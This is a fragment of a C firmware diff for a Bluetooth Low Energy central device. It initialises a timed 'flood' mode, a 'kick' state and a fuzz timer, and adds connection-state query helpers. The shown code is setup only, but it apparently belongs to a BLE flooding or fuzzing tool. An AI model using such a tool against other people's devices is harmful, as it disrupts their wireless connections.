+    m_sb_flood_stride = (interval_ms + BLE_SB_TICK_MS - 1) / BLE_SB_TICK_MS;
+    if (m_sb_flood_stride == 0) {
+        m_sb_flood_stride = 1;
+    }
+    m_sb_flood_tick = 0;
+    m_sb_op = BLE_SB_OP_FLOOD;
+    m_sb_phase = BLE_SB_PHASE_IDLE;
+    m_kick_sb_cycles = 0;
+    m_kick_sb_index = 0;
+    m_kick_sb_sub = 0;
+    m_sb_wait_ticks = 0;
+    m_flood_state  = 1;
+    m_kick_sb_state = 1;
+    rgb_marquee_set_ble_active_anim(true);
+    return app_timer_start(m_fuzz_timer, APP_TIMER_TICKS(BLE_SB_TICK_MS), NULL);
 }
 
 uint16_t ble_central_get_state(uint8_t *out, uint16_t out_cap) {
@@ -1151,4 +1715,15 @@ uint16_t ble_central_copy_log(uint16_t start_index, uint8_t *out, uint16_t out_c
         o += dlen;
     }
     return o;
+}
+
+
+// Central link state queries used by ble_radio_set() to tear down the
+// central connection cleanly on a radio toggle.
+bool ble_central_is_connected(void) {
+    return m_conn_state == 2;
+}
+
+bool ble_central_is_connecting(void) {
+    return m_conn_state == 1 || m_kick_sb_state == 1;
 }
